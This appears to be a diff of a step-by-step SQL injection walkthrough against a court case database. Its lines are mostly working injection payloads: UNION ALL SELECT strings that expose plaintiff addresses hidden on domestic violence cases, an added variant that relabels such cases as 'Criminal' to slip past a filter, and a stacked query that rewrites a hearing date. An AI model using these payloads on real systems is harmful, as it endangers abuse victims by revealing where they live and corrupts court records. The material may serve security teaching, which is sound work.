@@ -48,6 +48,10 @@ fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_
 Step 5: We notice on domestic violence cases the plaintiff addres isn't shown. Using the same trick as before we can show the plaintiff address as case description
 fakecasenumber' UNION ALL SELECT Case_Number,Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,CONCAT("Plaintiffs Address: ",Plaintiff_Address) as Case_Description,Judge From casedata WHERE Case_Number = '12C934902
 
+Or we could change the case type to something other than DV to trick the code that looks for DV cases.
+
+fakecasenumber' UNION ALL SELECT Case_Number,"Criminal" as Case_Type,Plaintiff_Name,Plaintiff_Address,Defendant_Name,Defendant_Address,Hearing_Date,Case_Description,Judge From casedata WHERE Case_Number = '12C934902
+
 Step 6: We test to see if it will let us run multiple queries. If the permissions aren't set right we can update or delte out information.
 //Resets the hearing date for a month earlier.
 fakecasenumber'; UPDATE casedata SET Hearing_Date = '10/25/2019' WHERE Case_Number = '12C934910
